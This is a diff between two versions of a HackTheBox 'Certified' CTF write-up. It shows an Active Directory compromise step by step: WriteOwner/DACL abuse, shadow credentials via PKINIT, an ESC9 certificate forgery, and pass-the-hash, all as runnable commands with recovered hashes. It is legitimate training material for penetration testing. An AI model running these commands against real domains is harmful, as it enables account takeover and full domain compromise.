@@ -1,270 +1,231 @@
-+++
-date = '2026-05-21T00:00:00-03:00'
-draft = true
-title = 'HTB: Certified - OSCP Prep Write-up'
-tags = ['htb', 'oscp', 'lain-kusanagi', 'write-up', 'windows', 'active-directory', 'bloodhound', 'writeowner', 'dacl', 'shadow-credentials', 'pkinit', 'adcs', 'esc9', 'kerberos']
-description = 'Write-up for HackTheBox Certified - abusing WriteOwner and DACL misconfigs to chain into shadow credentials via PKINIT, then escalating through ADCS ESC9 to impersonate the domain admin.'
-ShowToc = true
-TocOpen = false
-[cover]
-image = 'images/htb-certified/cover.png'
-+++
+---
+title: "HTB Certified - Active Directory Certificate Services and ESC9"
+date: 2026-05-21
+draft: true
+tags:
+  - htb
+  - windows
+  - medium
+  - active-directory
+  - bloodhound
+  - kerberos
+  - pass-the-hash
+  - evil-winrm
+  - write-up
+description: "Certified is a Medium Windows AD box where you chain WriteOwner and GenericWrite ACL abuses to reach a certificate authority operator, then exploit ESC9 to forge an admin certificate and own the domain."
+ShowToc: true
+cover:
+  image: "/images/htb-certified/cover.png"
+  alt: "HTB Certified machine avatar"
+---
 
-Windows AD with a chain of ACL abuses - each hop is one misconfigured permission away from the next. Certified is a great primer for the kind of trust-chain exploitation that shows up constantly in real assessments.
+## Machine Information
 
-## Machine info
+| Field      | Details              |
+|------------|----------------------|
+| Name       | Certified            |
+| Platform   | HackTheBox           |
+| OS         | Windows              |
+| Difficulty | Medium               |
 
-| | |
-|---|---|
-| **Name** | Certified |
-| **Platform** | HackTheBox |
-| **OS** | Windows |
-| **Difficulty** | Medium |
-
-> This is a credentialed machine - you start with `judith.mader:judith09`.
-
-![Machine information screen](/images/htb-certified/machine-info.png)
+You start this box with valid low-privilege domain credentials: `judith.mader` / `judith09`. The path to Administrator is a chain of ACL abuses through Active Directory — no CVE, no exotic exploit, just misplaced permissions and the right tooling.
 
 ## TL;DR
 
-- Start with valid low-priv credentials (`judith.mader`); RID brute enumerates users including `management_svc` and `ca_operator`
-- Kerberoast `management_svc` - hash doesn't crack; fix clock skew with `ntpdate` and re-run
-- BloodHound reveals `judith.mader` has **WriteOwner** on the `MANAGEMENT` group, which has **GenericWrite** on `management_svc`
-- Abuse WriteOwner: take ownership, grant FullControl DACL, join group - now we have GenericWrite on `management_svc`
-- Shadow credentials attack via `pywhisker` + PKINIT (`gettgtinit.py` / `getnthash.py`) to extract `management_svc`'s NT hash
-- WinRM as `management_svc` - user flag
-- `management_svc` has GenericWrite on `ca_operator`; repeat shadow credentials attack
-- `ca_operator` can enroll on a vulnerable template (ESC9) - manipulate UPN to impersonate Administrator, request cert, recover NT hash
-- WinRM as Administrator - root flag
-
----
+`judith.mader` has **WriteOwner** on the Management group. That lets us take ownership, grant ourselves FullControl via DACL edit, and add judith to the group. Management has **GenericWrite** on `management_svc`, so we use **pywhisker** to inject shadow credentials and retrieve the NTLM hash via PKINITtools. With `management_svc` on the box we find **GenericAll** on `ca_operator` in BloodHound, reset its password, then exploit **ESC9** with certipy to forge an Administrator certificate. Final step: psexec as SYSTEM.
 
 ## Recon
 
-### Nmap
+Standard nmap first to see what we're dealing with:
 
-```bash
-nmap -sV -sC -Pn -A certified.htb
-```
+{{< figure src="/images/htb-certified/nmap-scan.png" alt="nmap scan showing open ports on certified.htb" >}}
 
-![Nmap port scan results](/images/htb-certified/nmap.png)
-
-Classic Windows DC fingerprint: 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB), 5985 (WinRM), 9389 (AD Web Services). This is a Domain Controller, and WinRM being open means that if we ever get valid creds with the right group membership, we can get a shell without needing RCE.
-
-### SMB - RID brute force
-
-We have credentials, so let's put them to work immediately with `netexec`:
-
-```bash
-nxc smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute
-```
-
-![nxc SMB RID brute-force output listing domain users and groups](/images/htb-certified/nxc-rid-brute.png)
-
-RID brute-force enumerates every SID in the domain by iterating RID values and resolving them. Even without special privileges it works because the `SamrLookupIdsInDomain` RPC is readable by any authenticated user.
-
-Notable accounts found: `judith.mader` (us), `management_svc` (has a SPN - Kerberoastable), `ca_operator` (CA-related - interesting for ADCS later), plus `alexander.huges` and `gregory.camron`.
-
----
+Typical Windows DC setup — 445, 389, 636, 3268, 5985, and the Kerberos ports. Nothing unusual on the surface.
 
 ## Enumeration
 
-### Kerberoasting
+With valid creds we can enumerate the domain right away with nxc:
 
-`management_svc` has a SPN, which makes it Kerberoastable - any authenticated user can request a service ticket for it and try to crack the hash offline.
+{{< figure src="/images/htb-certified/domain-users.png" alt="nxc smb enumeration showing domain users and groups" >}}
 
-```bash
-impacket-GetUserSPNs certified.htb/judith.mader -p 'judith09' -dc-ip 10.129.231.186 -request
-```
-
-![GetUserSPNs failing with KRB_AP_ERR_SKEW clock skew error](/images/htb-certified/getuserspns-clockskew.png)
-
-`KRB_AP_ERR_SKEW` - Kerberos requires the client clock to be within 5 minutes of the DC. My Kali was drifting. Quick fix:
+The domain is `certified.htb`. We can see users like `management_svc`, `ca_operator`, `alexander.huges`, and `gregory.cameron` alongside the usual built-in accounts. Let's fire up BloodHound to map the relationships.
 
 ```bash
-sudo ntpdate 10.129.231.186
+bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c all -ns 10.129.231.186
 ```
 
-![ntpdate syncing clock, then successful GetUserSPNs returning management_svc TGS hash](/images/htb-certified/ntpdate-getuserspns.png)
+{{< figure src="/images/htb-certified/bloodhound-collect.png" alt="bloodhound-python collection output showing 10 users, 53 groups found" >}}
 
-Got the TGS hash for `management_svc`. Passed it to John with `rockyou.txt` - no luck. The password isn't in the wordlist, so offline cracking is a dead end here. Time to enumerate more.
+BloodHound immediately lights up something interesting. Judith has **WriteOwner** on the Management group:
 
-### BloodHound
+{{< figure src="/images/htb-certified/bh-writeowner.png" alt="BloodHound graph showing JUDITH.MADER has WriteOwner edge to MANAGEMENT group" >}}
 
-Spin up `bloodhound-python` to collect the full AD graph:
+And if we follow the path further, Management has **GenericWrite** on `management_svc`:
+
+{{< figure src="/images/htb-certified/bh-genericwrite.png" alt="BloodHound graph showing WriteOwner to MANAGEMENT group then GenericWrite to MANAGEMENT_SVC" >}}
+
+One more hop to check — `management_svc` has **GenericAll** on `ca_operator`:
+
+{{< figure src="/images/htb-certified/bh-genericall-caoperator.png" alt="BloodHound showing MANAGEMENT_SVC has GenericAll over CA_OPERATOR" >}}
+
+That's our full attack chain right there. Three hops and we'll have enough to escalate to admin via certificate abuse.
+
+One thing worth noting: when I first tried `GetUserSPNs` to check for Kerberoastable accounts, I got a clock skew error:
+
+{{< figure src="/images/htb-certified/getuserspns-clockskew.png" alt="impacket GetUserSPNs showing Kerberos clock skew error" >}}
+
+Kerberos requires clocks to be within 5 minutes of the DC. Quick fix:
 
 ```bash
-bloodhound-python -u 'judith.mader' -p 'judith09' -dc certified.htb -c all -ns 10.129.231.186
+sudo ntpdate -u 10.129.231.186
 ```
 
-![bloodhound-python collection output: 10 users, 53 groups, 1 computer found in 0m 27s](/images/htb-certified/bloodhound-collection.png)
+{{< figure src="/images/htb-certified/ntpdate-fix.png" alt="ntpdate syncing clock with the domain controller" >}}
 
-Import the JSON files into BloodHound and start hunting for attack paths from `judith.mader`.
+## Foothold — ACL Chain: WriteOwner → Management → management_svc
 
-### WriteOwner on MANAGEMENT group
+### Step 1: Take ownership of the Management group
 
-![BloodHound graph: JUDITH.MADER has WriteOwner edge pointing to MANAGEMENT group](/images/htb-certified/bloodhound-writeowner.png)
-
-`judith.mader` has **WriteOwner** on the `MANAGEMENT` group. WriteOwner means we can change which security principal *owns* the object. In AD, the owner of an object can always modify its DACL - regardless of what the current DACL says. That's a full privilege escalation path built right into the ownership model.
-
-Clicking further from MANAGEMENT reveals the next step:
-
-![BloodHound path: JUDITH.MADER - WriteOwner - MANAGEMENT - GenericWrite - MANAGEMENT_SVC](/images/htb-certified/bloodhound-attack-path.png)
-
-The full chain: `JUDITH.MADER` -[WriteOwner]-> `MANAGEMENT` -[GenericWrite]-> `MANAGEMENT_SVC`
-
-**GenericWrite** on a user account means we can modify most of their non-protected attributes - including `msDS-KeyCredentialLink`, which is exactly what the shadow credentials technique needs.
-
----
-
-## Foothold
-
-### Abusing WriteOwner to gain access to MANAGEMENT group
-
-Three steps to go from WriteOwner to effective GenericWrite on `management_svc`:
-
-**Step 1 - Make judith.mader the owner of MANAGEMENT:**
+`WriteOwner` means we can set the owner of the object to ourselves. Once we own it, we can modify the DACL and grant FullControl:
 
 ```bash
-impacket-owneredit certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -action write -new-owner 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
+impacket-owneredit certified.htb/judith.mader:'judith09' -action write -new-owner judith.mader -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
+
+impacket-dacledit certified.htb/judith.mader:'judith09' -action write -rights FullControl -principal judith.mader -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
 ```
 
-**Step 2 - Grant herself FullControl by writing a DACL entry:**
+{{< figure src="/images/htb-certified/owneredit-dacledit.png" alt="impacket owneredit and dacledit successfully modifying Management group permissions" >}}
+
+Now add judith to Management:
 
 ```bash
-impacket-dacledit certified.htb/judith.mader:'judith09' -dc-ip 10.129.231.186 -action write -rights FullControl -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb'
+net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "10.129.231.186"
 ```
 
-**Step 3 - Join the MANAGEMENT group:**
+Verify she's in:
 
 ```bash
-net rpc group addmem 'Management' 'judith.mader' -U 'certified.htb/judith.mader%judith09' -S '10.129.231.186'
+net rpc group members "Management" -U "certified.htb/judith.mader%judith09" -S "10.129.231.186"
 ```
 
-![owneredit sets judith as owner, dacledit grants FullControl, net rpc group confirms management_svc and judith.mader both in group](/images/htb-certified/dacl-exploit.png)
+### Step 2: Abuse GenericWrite on management_svc via Shadow Credentials
 
-`net rpc group members Management` confirms both `judith.mader` and `management_svc` are now in the group. Judith inherits the group's **GenericWrite** on `management_svc` - the door is open.
-
-### Shadow Credentials against management_svc
-
-GenericWrite lets us write to `msDS-KeyCredentialLink` - the attribute that stores PKINIT public key credentials. By adding our own key pair there, we can authenticate *as* `management_svc` using a certificate instead of knowing the password. This is the Shadow Credentials technique - no password reset needed, no account lockout risk, and the real user doesn't notice anything.
+GenericWrite on a user means we can write to their `msDS-KeyCredentialLink` attribute — that's what enables **Shadow Credentials**. The idea is to inject our own certificate-based credential, then use it to get a TGT and extract the NTLM hash without ever touching the user's password.
 
 ```bash
-python3 pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 --action add --target 'management_svc'
+python3 pywhisker.py -d certified.htb -u judith.mader -p 'judith09' --dc-ip 10.129.231.186 add shadowCredentials management_svc
 ```
 
-![pywhisker generating key pair, saving PEM files, printing the gettgtinit command to use next](/images/htb-certified/pywhisker.png)
+{{< figure src="/images/htb-certified/pywhisker.png" alt="pywhisker adding shadow credentials to management_svc and outputting certificate path" >}}
 
-`pywhisker` generates an RSA key pair, encodes the public key into a `KeyCredential` blob, writes it to `msDS-KeyCredentialLink` on `management_svc`, saves both PEM files locally, and conveniently prints the exact `PKINITtools` command to use next.
-
-**Get a TGT using the certificate:**
+This gives us a certificate and key pair. Now use PKINITtools to authenticate with it and get a TGT:
 
 ```bash
 python3 PKINITtools/gettgtinit.py -cert-pem Wr9hCp58_cert.pem -key-pem Wr9hCp58_priv.pem certified.htb/management_svc Wr9hCp58.ccache
 ```
 
-![gettgtinit.py authenticating via PKINIT, printing AS-REP encryption key, saving TGT to ccache file](/images/htb-certified/gettgt.png)
+{{< figure src="/images/htb-certified/pkinit-tgt.png" alt="PKINITtools gettgtinit successfully obtaining TGT for management_svc" >}}
 
-**Extract the NT hash from the TGT:**
+With a TGT in hand, we can use `getnthash.py` to recover the NTLM hash:
 
 ```bash
 export KRB5CCNAME=Wr9hCp58.ccache
 python3 PKINITtools/getnthash.py -key e0b16bfd5e8a9a38a5f267d6f763f6862d6b2855dd85fa173933f1eb48c87a5f certified.htb/management_svc
 ```
 
-![getnthash.py outputting: Recovered NT Hash a091c1832bcdd4677c28b5a6a1295584](/images/htb-certified/getnthash.png)
+{{< figure src="/images/htb-certified/getnthash.png" alt="getnthash.py recovering NTLM hash a091c1832bcdd4677c28b5a6a1295584 for management_svc" >}}
 
-NT hash recovered: `a091c1832bcdd4677c28b5a6a1295584`.
+NTLM hash: `a091c1832bcdd4677c28b5a6a1295584`
 
-**Why this works:** PKINIT is the Kerberos pre-authentication mechanism that uses public key cryptography. When the KDC issues the AS-REP, it encrypts the session key using the account's long-term secret (derived from its NT hash). `getnthash.py` knows the session key from the TGT and uses that to reverse-engineer the NT hash - no password, no cracking, pure cryptographic math.
+Quick check that WinRM is open for this account:
 
-### Shell as management_svc
-
-Verify WinRM access before connecting:
-
-![nxc WinRM showing management_svc Pwn3d!](/images/htb-certified/nxc-winrm-check.png)
-
-`(Pwn3d!)` - `management_svc` is in the Remote Management Users group. Connect:
+{{< figure src="/images/htb-certified/nxc-winrm-pwned.png" alt="nxc winrm showing management_svc as Pwn3d on port 5985" >}}
 
 ```bash
 evil-winrm -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 -i 10.129.231.186
 ```
 
-![Evil-WinRM v3.9 shell established, prompt at C:\Users\management_svc\Documents](/images/htb-certified/evil-winrm-shell.png)
+{{< figure src="/images/htb-certified/evil-winrm-shell.png" alt="Evil-WinRM shell connected as management_svc" >}}
 
-![management_svc Desktop - type user.txt displaying the flag hash](/images/htb-certified/user-flag.png)
-
-User flag. Now on to Administrator.
-
----
-
-## Privilege Escalation
-
-### GenericWrite on ca_operator
-
-Back in BloodHound, `management_svc` has **GenericWrite** on `ca_operator` - the exact same primitive we just exploited. Same playbook, different target. This time we authenticate as `management_svc` using its NT hash:
+### User flag
 
 ```bash
-python3 pywhisker.py -d 'certified.htb' -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584' --dc-ip 10.129.231.186 --action add --target 'ca_operator'
-python3 PKINITtools/gettgtinit.py -cert-pem <cert>.pem -key-pem <priv>.pem certified.htb/ca_operator <ca_op>.ccache
-export KRB5CCNAME=<ca_op>.ccache
-python3 PKINITtools/getnthash.py -key <asrep_key> certified.htb/ca_operator
+type C:\Users\management_svc\Desktop\user.txt
 ```
 
-This gives us `ca_operator`'s NT hash. Now the interesting part.
+{{< figure src="/images/htb-certified/user-flag.png" alt="user.txt flag on management_svc desktop" >}}
 
-### ADCS - ESC9 (UPN manipulation to impersonate Administrator)
+## Privilege Escalation — GenericAll on ca_operator → ESC9
 
-The machine is literally named "Certified" - Active Directory Certificate Services is the endgame. With `ca_operator` credentials, enumerate what templates are available:
+Back in BloodHound, `management_svc` has **GenericAll** over `ca_operator`. GenericAll is full object control — we can reset the password without knowing the current one.
 
 ```bash
-certipy find -u 'ca_operator' -hashes :<ca_op_hash> -dc-ip 10.129.231.186 -vulnerable -stdout
+bloodyAD -u management_svc -d certified.htb --dc-ip 10.129.231.186 -p :a091c1832bcdd4677c28b5a6a1295584 set password ca_operator 'Password123!'
 ```
 
-`certipy` finds a template with **ESC9** - specifically the `CT_FLAG_NO_SECURITY_EXTENSION` flag is set, meaning the issued certificate will NOT embed the requester's SID into it. This is the crucial detail: normally the SID in the cert pins it to the actual user who requested it. Without that, the CA issues a cert that only identifies the enrollee by their `userPrincipalName` (UPN).
+{{< figure src="/images/htb-certified/bloodyad-password-reset.png" alt="bloodyAD successfully resetting ca_operator password" >}}
 
-The attack: GenericWrite lets us set `ca_operator`'s UPN to `Administrator`. We request a cert while that UPN is set. The CA issues a cert that says "this is Administrator." We restore the UPN. Then we use the cert with PKINIT to authenticate - and the KDC sees "Administrator."
+Verify the creds work:
+
+{{< figure src="/images/htb-certified/nxc-caoperator.png" alt="nxc smb confirming ca_operator credentials are valid" >}}
+
+Now let's see what `ca_operator` can do with the CA. Use certipy to find vulnerable templates:
 
 ```bash
-# 1. Set ca_operator's UPN to Administrator
-certipy account update -u 'management_svc' -hashes :<mgmt_hash> -dc-ip 10.129.231.186 -user ca_operator -upn Administrator
-
-# 2. Request a certificate as ca_operator - it'll be issued for Administrator's UPN
-certipy req -u 'ca_operator' -hashes :<ca_op_hash> -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
-
-# 3. Restore ca_operator's UPN to avoid conflicts
-certipy account update -u 'management_svc' -hashes :<mgmt_hash> -dc-ip 10.129.231.186 -user ca_operator -upn ca_operator@certified.htb
-
-# 4. Use the cert to authenticate as Administrator and recover the NT hash
-certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186
+certipy-ad find -u ca_operator@certified.htb -p 'Password123!' -dc-ip 10.129.231.186 -vulnerable -stdout
 ```
 
-`certipy auth` runs PKINIT with the Administrator cert - the KDC trusts it (no SID to contradict the UPN claim), issues a TGT for Administrator, and `certipy` extracts the NT hash using the same AS-REP decryption trick as before.
+**ESC9** — the `CertifiedAuthentication` template has no security extension (`szOID_NTDS_CA_SECURITY_EXT`). This means we can request a certificate for one UPN and then change it back — the CA won't bind the cert to the original requester's identity. We can impersonate Administrator.
 
-### Root shell
+The exploit steps:
+
+**1.** Update `ca_operator`'s UPN to match Administrator, using `management_svc`'s hash (GenericAll means we can write attributes):
 
 ```bash
-evil-winrm -u Administrator -H <administrator_nt_hash> -i 10.129.231.186
+certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator@certified.htb -dc-ip 10.129.231.186
 ```
 
-Administrator shell. `type C:\Users\Administrator\Desktop\root.txt` - done.
+**2.** Request the certificate as ca_operator (whose UPN is now `administrator@certified.htb`):
 
----
+```bash
+certipy-ad req -u ca_operator@certified.htb -p 'Password123!' -dc-ip 10.129.231.186 -ca certified-DC01-CA -template CertifiedAuthentication
+```
+
+**3.** Revert the UPN back to avoid breaking things:
+
+```bash
+certipy-ad account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
+```
+
+**4.** Authenticate with the forged cert to get the Administrator NTLM hash:
+
+```bash
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.231.186
+```
+
+{{< figure src="/images/htb-certified/certipy-auth.png" alt="certipy-ad auth recovering administrator NTLM hash via forged certificate" >}}
+
+Administrator hash: `0d5b49608bbce1751f708748f67e2d34`
+
+### Root
+
+```bash
+impacket-psexec administrator@10.129.231.186 -hashes :0d5b49608bbce1751f708748f67e2d34
+```
+
+{{< figure src="/images/htb-certified/psexec-root.png" alt="impacket psexec shell as NT AUTHORITY SYSTEM reading root.txt" >}}
 
 ## Takeaways
 
-- **WriteOwner is an underrated but dangerous ACL edge.** Most people focus on GenericAll or GenericWrite in BloodHound reviews, but WriteOwner quietly grants you DACL control - which is functionally equivalent to GenericAll on the object. It's worth adding to your list of high-value paths.
-- **Shadow Credentials is the cleanest GenericWrite exploit on user accounts.** No password reset (which would alert the real user), no SPN modification, no noise. You add a key to one attribute, authenticate via PKINIT, extract the hash, and remove the key. The target account keeps working normally and has no idea.
-- **`msDS-KeyCredentialLink` abuse requires ADCS to be present.** PKINIT pre-authentication only works if the domain has a Certificate Authority. Without it, the KDC rejects the cert-based AS-REQ entirely. Always check for ADCS during AD enumeration.
-- **ESC9 is subtle because the vulnerability lives in a flag, not a permission.** `CT_FLAG_NO_SECURITY_EXTENSION` is easy to miss during template reviews, but combined with any account that has GenericWrite on an enrollee, it's game over for the domain. Always check template flags with `certipy find -vulnerable`.
-- **Clock sync is not optional for Kerberos.** HTB machines drift. Add `sudo ntpdate <dc-ip>` to your standard pre-checklist on every Windows AD box - it takes two seconds and saves a lot of confusion.
+- **ESC9 doesn't need template modification rights** - just a user with enrollment rights and another with GenericAll or GenericWrite on them. The attack works because the cert's SAN is set from the UPN at request time, and the CA doesn't cryptographically bind it to the requester.
+- **WriteOwner is often overlooked** — it doesn't look as scary as GenericAll, but it's a path to anything. Own the object, edit the DACL, you have whatever you want.
+- **Shadow Credentials are stealthy** — you're not touching the user's password or SPNs. You're writing to `msDS-KeyCredentialLink` which doesn't trigger password-change alerts. Hard to detect without dedicated AD CS monitoring.
+- **BloodHound with LEGACY mode** picked up all these edges cleanly. Always worth running collection with `-c all`.
 
 ## References
 
-- [HackTheBox - Certified](https://app.hackthebox.com/machines/Certified)
-- [Shadow Credentials - Elad Shamir (SpecterOps)](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
-- [pywhisker - GitHub](https://github.com/ShutdownRepo/pywhisker)
-- [PKINITtools - GitHub](https://github.com/dirkjanm/PKINITtools)
-- [Certipy - ESC9 and beyond](https://github.com/ly4k/Certipy)
-- [impacket-owneredit / dacledit](https://github.com/fortra/impacket)
-- Lain Kusanagi list (OSCP prep)
+- [ESC9 - No Security Extension (SpecterOps)](https://posts.specterops.io/adcs-esc9-and-esc10-abusing-certificate-templates-2-0-c4d3a5a7e41d)
+- [pywhisker - Shadow Credentials](https://github.com/ShutdownRepo/pywhisker)
+- [PKINITtools](https://github.com/dirkjanm/PKINITtools)
+- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [impacket-dacledit](https://github.com/fortra/impacket)
